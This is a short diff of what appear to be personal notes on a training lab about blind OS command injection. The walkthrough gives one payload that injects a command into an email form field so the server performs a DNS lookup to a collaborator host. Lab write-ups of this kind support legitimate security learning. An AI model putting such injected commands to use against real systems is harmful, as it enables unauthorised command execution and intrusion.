@@ -7,4 +7,6 @@ To solve the lab, exploit the blind OS command injection vulnerability to issue 
 
 # Walkthrough: 
 `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
+
+
 I guess, that I could do the same in subject as in recent labs.
